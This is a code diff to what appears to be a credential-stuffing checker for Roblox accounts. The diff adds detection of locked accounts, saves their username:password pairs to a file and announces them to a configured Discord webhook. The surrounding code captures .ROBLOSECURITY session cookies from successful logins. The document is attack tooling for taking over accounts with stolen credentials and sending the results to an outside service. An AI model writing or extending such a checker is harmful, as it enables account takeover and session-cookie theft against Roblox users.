@@ -17,8 +17,10 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 config = Util.get_config()
 
 WEBHOOK_ENABLED = config["logWebhook"]
+LOCKED_WEBHOOK = config.get("lockedWebhook")
+LOCKED_WEBHOOK_ENABLED = bool(LOCKED_WEBHOOK)
 
-if WEBHOOK_ENABLED == True:
+if WEBHOOK_ENABLED == True or LOCKED_WEBHOOK_ENABLED == True:
     from discord_webhook import DiscordWebhook, DiscordEmbed
 
 if type(WEBHOOK_ENABLED) != bool:
@@ -87,6 +89,9 @@ class Roblox:
         
         if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
             return response.json()
+        
+        if "Account has been locked" in response.text:
+            raise ValueError("locked")
         
         if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
             self.account[0] = response.json()["user"]["name"]
@@ -211,6 +216,9 @@ class Roblox:
 
                     self.checked = True
                     continue
+
+                if "Account has been locked" in response.text:
+                    raise ValueError("locked")
 
                 if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
                     user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
@@ -449,6 +457,27 @@ class Roblox:
                     with self.lock.get_lock():
                         with open("output/invalid.txt", "a", encoding="utf-8") as file:
                             file.write(f'{self.account[0]}:{self.account[1]}\n')
+                elif str(e) == "locked":
+                    self.checked = True
+
+                    Output("LOCKED").log(f"Valid account [locked] | {self.account[0]}")
+
+                    with self.lock.get_lock():
+                        with open("output/locked.txt", "a", encoding="utf-8") as file:
+                            file.write(f'{self.account[0]}:{self.account[1]}\n')
+
+                    if LOCKED_WEBHOOK_ENABLED:
+                        try:
+                            webhook = DiscordWebhook(url=LOCKED_WEBHOOK, content="@here")
+
+                            embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='FFFF00')
+
+                            embed.set_timestamp()
+
+                            webhook.add_embed(embed)
+                            webhook.execute()
+                        except:
+                            pass
                 else:
                     Output("ERROR").log(str(e))
 
